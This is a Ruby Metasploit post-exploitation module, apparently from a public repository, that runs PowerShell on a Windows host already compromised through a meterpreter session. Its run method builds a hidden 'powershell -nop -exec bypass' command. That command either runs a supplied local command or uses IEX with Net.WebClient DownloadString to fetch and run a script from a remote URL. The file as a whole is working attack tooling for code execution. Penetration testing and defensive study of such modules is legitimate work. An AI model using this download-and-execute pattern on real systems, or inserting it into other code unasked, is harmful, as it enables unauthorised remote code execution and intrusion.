##
# 	This module requires Metasploit: http//metasploit.com/download
# 	Current source: https://github.com/rapid7/metasploit-framework
#
#	For local commands use "& {command}" format
##
require 'msf/core'


class Metasploit3 < Msf::Post
	
  

  def initialize(info = {})
    super(update_info(info,
      'Name'			=> 'Remote Powershell Script Execution',
      'Description'	 	=> %q{
        This module will run a remotely-hosted powershell script or local command on the remote system.
      },
      'License'       	=> BSD_LICENSE,
      'Platform'      	=> [ 'win' ],
      'SessionTypes'  	=> [ 'meterpreter' ],
      'Author'			=> [
          'Steve Borosh',	# @424f424f
          ],
       ))
	   
	register_options(
      [
		OptString.new( 'SCRIPT', [false, "The Powershell Script URL"]),
		OptString.new( 'LOCAL',	[false, "String for local commands"]),
        OptString.new( 'COMMAND', [false, "The script command to run"])
      ], self.class)
	  
		
  end
 
 def run
		if !(datastore['LOCAL'].nil? or datastore['LOCAL'].empty?)
		process = session.sys.process.execute("powershell -nop -exec bypass -c #{datastore['LOCAL']}", nil, {'Hidden' => 'true', 'Channelized' => true})
		else
		process = session.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{datastore['SCRIPT']}'); #{datastore['COMMAND']}\"", nil, {'Hidden' => 'true', 'Channelized' => true})
		end
				
		while(d = process.channel.read)
		print_line(d)
		end
		
		process.channel.close
		process.close
	end
		
end